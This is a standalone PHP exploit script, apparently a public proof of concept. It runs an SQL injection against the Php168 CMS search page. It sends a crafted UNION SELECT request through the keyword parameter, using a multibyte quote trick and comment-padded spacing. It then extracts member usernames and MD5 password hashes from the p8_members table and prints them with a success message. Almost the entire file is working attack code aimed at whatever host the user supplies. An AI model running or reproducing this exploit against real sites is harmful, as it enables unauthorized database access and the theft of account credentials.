<?

print_r(&#39;
********  Php168 SQL injection Exp.By racle@tian6.com  ********
                                                        
      Usage: php &#39;.$argv[0].&#39; host path    
      Example: php &#39;.$argv[0].&#39; www.tian6.com /blog/        
      Example2: php &#39;.$argv[0].&#39; cms.tian6.com /php168cms/blog/
****************************************************************
&#39;);
//verification du debut
if(stristr($argv[1],&quot;http://&quot;)){echo &quot;No http:// in the host!&quot;;die;}
else{$host=$argv[1];}
$path=$argv[2];


//sent
function sent($sock)  
{  
global  $host, $html;  
$ock=fsockopen(gethostbyname($host),&#39;80&#39;);  
if (!$ock) {  
echo &#39;No response from &#39;.$host; die;  
}  
fputs($ock,$sock);  
$html=&#39;&#39;;  
while (!feof($ock)) {  
$html.=fgets($ock);  
}  
fclose($ock);  
}  

//$cookies=&quot;hi&quot;;
$sock.=&quot;GET &quot;.$path.&quot;/search.php?type=blog&amp;Submit=%CB%D1%CB%F7&amp;action=search&amp;keyword=%cf%27/**/union/**/select/**/concat(0x7365637265746F66616432,username,0x7365637265746F66616432,password,0x7365637265746F66616432),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37/**/from/**/p8_members%20limit/**/20%23 HTTP/1.0\r\n&quot;;

$sock.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$sock.=&quot;Connection: close\r\n&quot;;
$sock.=&quot;Cookie: &quot;.$cookies.&quot;\r\n\r\n&quot;;
sent($sock);


//analyse

$found=stristr($html,&quot;secretofad2&quot;);
list($nothing,$username, $password) = explode(&quot;secretofad2&quot;, $found);



//resultat
if($username!=NULL)
{
print_r(&#39;
--------------------------------------------------------------------------------
[+]username -> &#39;.$username.&#39;
[+]password(Md5 Encode) -> &#39;.$password.&#39;
--------------------------------------------------------------------------------
&#39;);
}


//verification
if($host!=NULL)
{
function is_hash($password)
{
if (ereg(&quot;^[a-z0-9]{16}&quot;,$password)||ereg(&quot;^[a-z0-9]{32}&quot;,$password))
    {echo &quot;Exploit succeeded!&quot;;}
else {echo &quot;Exploit failed!&quot;;}
}
is_hash($password);
}
?>

